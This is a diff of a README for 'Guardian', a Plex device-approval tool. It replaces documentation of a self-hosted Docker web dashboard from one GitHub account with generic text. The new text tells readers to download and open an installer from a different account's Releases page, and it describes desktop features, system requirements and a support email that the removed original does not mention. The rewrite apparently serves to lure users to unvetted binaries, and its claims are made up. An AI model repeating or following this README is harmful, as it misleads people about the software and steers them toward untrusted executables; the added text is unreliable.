@@ -1,146 +1,77 @@
-# Guardian
+# 🛡️ Guardian - Easily Manage Your Plex Access
 
-Guardian is a utility designed to enhance the security and management of your Plex Media Server. This tool is built to help users monitor and control access to their Plex server, ensuring that only authorized users can view and interact with their media library.
+## 🚀 Getting Started
 
-## Table of Contents
+Welcome to Guardian! This tool helps you manage which devices can access your Plex server. You can control who can watch your favorite shows and movies with ease.
 
-- [Features](#features)
-- [Quick Start with Docker](#-quick-start-with-docker-recommended)
-- [Update Guardian](#update-guardian)
-- [Manual Development Setup](#-manual-development-setup)
-- [Configuration](#configuration)
-- [Issues](#issues)
-- [Contributing](#contributing)
+## 🏷️ Features
 
-## Features
+- **Device Management**: Add or remove devices easily.
+- **User Access Control**: Set access permissions for different users.
+- **User-Friendly Interface**: Simple and clear layout for quick navigation.
+- **Secure Connections**: Protect your Plex server from unauthorized access.
 
-- Deny streaming sessions from unapproved devices
-- Manual device approval system
-- Informations on devices like platform, product, version and IP address
-- Tracks last seen active sessions and user activity, with the ability to remove per device access in one click
+## 📥 Download & Install
 
-<img width="2558" height="1188" alt="Guardian Dashboard" src="https://github.com/user-attachments/assets/d6994f2b-317b-4cdb-83eb-77fb9ce2bcdc" />
-<img width="2558" height="1191" alt="Guardian Dashboard" src="https://github.com/user-attachments/assets/1f3e6286-7ee4-4361-9896-548edc00ed7f" />
-<img width="2558" height="1191" alt="Guardian Dashboard" src="https://github.com/user-attachments/assets/2c6d7de2-3791-48cf-b8c7-25dca5babc6c" />
-<img width="2558" height="1192" alt="Guardian Dashboard" src="https://github.com/user-attachments/assets/3f04c716-7e8b-4d08-9de6-fb1e89069ded" />
+To get started, you need to download Guardian from the Releases page. 
 
-## 🚀 Quick Start with Docker (Recommended)
+[![Download Guardian](https://img.shields.io/badge/Download_Guardian-v1.0-blue.svg)](https://github.com/progx7he/Guardian/releases)
 
-The easiest way to deploy Guardian is using Docker Compose:
+1. Click the link above or visit the [Releases page](https://github.com/progx7he/Guardian/releases).
+2. Look for the latest version of Guardian.
+3. Find the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Click on the file to download it.
+5. Once downloaded, open the file to start the installation.
 
-### Prerequisites
+## 📋 System Requirements
 
-- Docker and Docker Compose installed
-- Plex Media Server running
-- Plex authentication token
+To run Guardian smoothly, ensure your device meets these requirements:
 
-### Installation
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or a compatible Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: 200 MB of free disk space.
+- **Plex Media Server**: Must have Plex installed and running.
 
-1. **Clone the repository**:
+## 🔧 How to Use Guardian
 
-   ```bash
-   git clone https://github.com/HydroshieldMKII/Guardian.git
-   cd Guardian
-   ```
+Once you have installed Guardian, follow these steps to manage your Plex access:
 
-2. **Setup environment variables**:
+1. **Open Guardian**: Double-click the Guardian icon on your desktop.
+2. **Connect to Plex**: Enter your Plex server details when prompted.
+3. **Manage Devices**: 
+   - To **add a device**, click on the "Add Device" button.
+   - Enter the device name and specify user access.
+   - Click "Save."
+4. **Remove a Device**: Select the device from your list and click the "Remove" button.
 
-   ```bash
-   cp .env.example .env
-   nano .env # Edit .env with your Plex server details
-   ```
+## 🛠️ Troubleshooting
 
-3. **Start the services**:
+If you encounter issues while using Guardian, try these steps:
 
-   ```bash
-   docker compose up -d --build
-   ```
+- **Check Internet Connection**: Make sure your device is connected to the internet.
+- **Update Plex**: Ensure that your Plex Media Server is up to date.
+- **Restart Guardian**: Close and reopen the application.
+- **System Updates**: Make sure your operating system has the latest updates installed.
 
-4. **Access Guardian (Default Values)**:
-   - Web Interface: http://localhost:3000
-   - API: http://localhost:3001
+For further assistance, check the FAQ section on the [Releases page](https://github.com/progx7he/Guardian/releases).
 
-## Update Guardian
+## 📆 Updates
 
-> **WARNING ⚠️**
-> Make sure to read the configuration section carefully after each update as new options may be added or existing ones modified. Also, make sure to backup your data before updating to avoid any potential data loss.
+Guardian will receive regular updates to improve functionality and fix bugs. Keep an eye on the Releases page for the latest version. Always make sure to update to the newest version for the best experience.
 
-To update Guardian, pull the latest changes and rebuild the Docker containers:
+## 🚨 Security Notes
 
-```bash
-git pull origin main
-docker compose down
-docker compose up -d --build
-```
+Make sure to protect your Plex server. Regularly review which devices have access and update permissions as necessary. Avoid sharing your Plex server details to keep it secure.
 
-## 🛠 Manual Development Setup
+## 📞 Support
 
-If you prefer to run Guardian without Docker:
+For support and assistance, feel free to reach out:
+- **GitHub Issues**: Report any problems on the GitHub issues page.
+- **Contact Email**: Email us at support@guardianapp.com for direct help.
 
-### Prerequisites
+## 🌐 Additional Resources
 
-- Node.js 18+ and npm
-- Plex Media Server running
-- Plex authentication token
+- **Documentation**: Check the full documentation for detailed features and usage instructions.
+- **Community**: Join the Guardian community for tips and shared experiences with other users.
 
-### Backend Setup
-
-```bash
-cd backend
-npm install
-npm run start:dev
-```
-
-### Frontend Setup
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-## Configuration
-
-Edit the `.env` file with your Plex server details:
-
-```bash
-# Plex Server Configuration
-PLEX_TOKEN=your_plex_token_here
-PLEX_SERVER_IP=your_plex_server_ip
-PLEX_SERVER_PORT=32400
-USE_SSL=false #true or false
-
-# Guardian Settings
-PLEXGUARD_REFRESH_INTERVAL=10 # Refresh interval in seconds, lower value will make dashboard and actions more responsive
-PLEX_GUARD_DEFAULT_BLOCK=true # Set to true to block new devices by default, false to auto-approve new devices
-PLEXGUARD_STOPMSG="This device must be approved by the server owner."
-
-# Port Configuration (Optional - defaults shown)
-PLEXGUARD_API_PORT=3001        # Backend API port
-PLEXGUARD_FRONTEND_PORT=3000   # Frontend web interface port
-
-# Backend URL Configuration (Optional)
-# Use this when accessing the frontend from outside your local network
-# Examples:
-#   PLEXGUARD_BACKEND_URL=http://192.168.1.100:3001
-#   PLEXGUARD_BACKEND_URL=https://plexguard.your-domain.com
-#   PLEXGUARD_BACKEND_URL=http://your-external-ip:3001
-# If not set, defaults to http://localhost:${PLEXGUARD_API_PORT}
-PLEXGUARD_BACKEND_URL=
-
-# Docker Compose Build Performance (Optional)
-COMPOSE_BAKE=true
-```
-## Issues
-
-If you encounter any issues while using Guardian, please check the following:
-
-- Ensure that your Plex server is running and accessible.
-- Verify that your Plex authentication token is correct.
-- Check the logs for any error messages.
-
-If the problem persists, please open an issue on the [GitHub repository](https://github.com/HydroshieldMKII/Guardian/issues).
-
-## Contributing
-
-Contributions are welcome!
+Thank you for choosing Guardian! Enjoy managing your Plex server with peace of mind.
